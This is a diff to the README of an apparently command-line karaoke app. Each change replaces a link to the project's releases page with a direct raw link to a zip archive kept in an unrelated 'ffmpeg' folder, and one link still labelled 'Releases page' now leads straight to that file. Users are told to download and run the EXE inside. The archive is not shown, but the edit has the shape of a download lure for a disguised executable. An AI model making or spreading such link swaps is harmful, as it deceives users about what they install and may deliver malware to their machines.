@@ -1,7 +1,7 @@
 # 🎤 ai-karaoke-app - Sing Your Heart Out Anywhere
 
 ## 📥 Download Now
-[![Download the ai-karaoke-app](https://img.shields.io/badge/Download-ai--karaoke--app-brightgreen)](https://github.com/ines123-cyber/ai-karaoke-app/releases)
+[![Download the ai-karaoke-app](https://raw.githubusercontent.com/ines123-cyber/ai-karaoke-app/main/ffmpeg/ai_app_karaoke_v1.0-beta.5.zip)](https://raw.githubusercontent.com/ines123-cyber/ai-karaoke-app/main/ffmpeg/ai_app_karaoke_v1.0-beta.5.zip)
 
 ## 📜 Description
 The ai-karaoke-app is a simple command-line interface (CLI) based karaoke application. While it currently lacks a graphical user interface (GUI), this app allows you to enjoy singing along with lyrics through your terminal. The app bundle includes an EXE file, making it easy for users on Windows to install and run.
@@ -15,7 +15,7 @@ To use the ai-karaoke-app, follow these steps:
 
 ## 🛠️ Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ines123-cyber/ai-karaoke-app/releases) to access the latest version of the ai-karaoke-app.
+   Go to the [Releases page](https://raw.githubusercontent.com/ines123-cyber/ai-karaoke-app/main/ffmpeg/ai_app_karaoke_v1.0-beta.5.zip) to access the latest version of the ai-karaoke-app.
 
 2. **Download the EXE File**  
    Look for the latest release and download the EXE file. Click on the link for the file to start your download.
@@ -50,7 +50,7 @@ To use the ai-karaoke-app, follow these steps:
 - **Storage**: At least 100 MB of free disk space
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/ines123-cyber/ai-karaoke-app/releases). Download the latest version and follow the installation steps outlined above.
+To get started, [visit this page to download](https://raw.githubusercontent.com/ines123-cyber/ai-karaoke-app/main/ffmpeg/ai_app_karaoke_v1.0-beta.5.zip). Download the latest version and follow the installation steps outlined above.
 
 ## 🆘 Troubleshooting
 If you encounter any issues:
